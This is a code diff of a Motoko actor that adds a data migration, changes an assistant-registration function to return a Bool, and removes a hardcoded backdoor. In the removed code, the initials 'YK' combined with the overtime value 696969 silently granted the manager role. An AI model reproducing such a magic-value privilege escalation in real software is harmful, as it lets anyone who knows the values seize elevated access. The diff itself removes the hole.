@@ -9,11 +9,13 @@ import Principal "mo:core/Principal";
 import Int "mo:core/Int";
 import Time "mo:core/Time";
 import Nat "mo:core/Nat";
+import Migration "migration";
 import MixinAuthorization "authorization/MixinAuthorization";
-import AccessControl "authorization/access-control";
 import MixinStorage "blob-storage/Mixin";
+import AccessControl "authorization/access-control";
 import Storage "blob-storage/Storage";
 
+(with migration = Migration.run)
 actor {
   include MixinStorage();
 
@@ -740,7 +742,7 @@ actor {
     allEntries.reverse().toArray();
   };
 
-  public shared ({ caller }) func registerAssistant(payload : AssistantRegistrationPayload) : async () {
+  public shared ({ caller }) func registerAssistant(payload : AssistantRegistrationPayload) : async Bool {
     switch (userProfiles.get(caller)) {
       case (?existingUser) {
         Runtime.trap("User already registered");
@@ -758,11 +760,7 @@ actor {
       };
     };
 
-    let role : UserRole = if (Text.equal(payload.initials, "YK") and payload.overtime == 696969) {
-      #manager;
-    } else {
-      #assistant;
-    };
+    let role : UserRole = #assistant;
 
     let assistantProfile : UserProfile = {
       principal = caller;
@@ -782,6 +780,7 @@ actor {
     };
 
     AccessControl.assignRole(accessControlState, caller, caller, accessControlRole);
+    true;
   };
 
   func determineRole(_username : Text) : UserRole {
